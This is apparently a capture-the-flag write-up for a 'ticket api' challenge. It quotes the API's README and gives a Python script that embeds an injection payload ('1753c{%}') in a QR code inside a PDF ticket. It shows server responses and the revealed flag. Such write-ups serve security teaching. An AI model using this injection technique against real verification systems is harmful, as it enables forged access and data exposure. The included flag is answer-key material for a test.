We were given a source folder for the application "ticket api", where we are supposed to upload tickets using a pdf, and verify it to get the details of the ticket. The goal here is to find the ticket with the flag. By inspecting the README.md from the source, we get good details on how to upload and verify the tickets:
```
# Ticket API

This API allows to upload, and then verify ticket for events (in example CTF challenge 🚩)

## Endpoints

### Upload

Upload allows you to upload new tickets to the system. These tickets can be then verified on the event entrance:

> curl -X POST -F "file=@/path/to/ticket/file.pdf" https://ticket-api-061f5e195e3d.1753ctf.com/upload

### Verify

While integrating your entrance gate thingy call this endpoint to verify if the ticket being shown to you is not forged:

> curl -X POST -F "file=@/path/to/ticket/file.pdf" https://ticket-api-061f5e195e3d.1753ctf.com/verify

## Security

Yes.
```

We also inspected the source code, and it was quite strict in what type of tickets it takes in. For the first part, it expects a QR code with a UUID, or else it will return an error.

We first tried to use a generator for the captcha and put it in a .pdf file to see how the application worked. We could upload the file and retrieve back information about the details and such (like ID, code and hash). We decided to make a python script that generates captcha that gets put on a .pdf with a specific payload.

```
from fpdf import FPDF
import qrcode

# Generate QR code with SQL injection payload
payload = "1753c{%}"
qr = qrcode.QRCode(
    version=1,
    error_correction=qrcode.constants.ERROR_CORRECT_L,
    box_size=10,
    border=4,
)
qr.add_data(payload)
qr.make(fit=True)

# Create an image from the QR Code
qr_img = qr.make_image(fill_color="black", back_color="white")
qr_img_path = "injected_qr.png"
qr_img.save(qr_img_path)

# Embed the QR code image into a PDF
class PDF(FPDF):
    def header(self):
        self.set_font('Arial', 'B', 12)

pdf = PDF()
pdf.add_page()
pdf.image(qr_img_path, x=10, y=8, w=100)
pdf_file_path = "ticket_with_injection.pdf"
pdf.output(pdf_file_path)

pdf_file_path
```

We tried to put payloads such as "1753c{", "1=1; --" etc. We noticed that this payload gets put on the "code" part of verify after we uploaded it. 
```
{"id":78,"code":"1=1;--","hash":"1369cd0fe2fc0dfccfbc3a14b90f776dfa77bbab"}
```
At some point I was curious what would happen if we put wildcard such as % in the flag, which happened to be the answer:
```
{"id":1,"code":"1753c{dizz_are_not_forged_if_they_have_the_same_hasshhh}","hash":"admin-needs-no-hash"}
```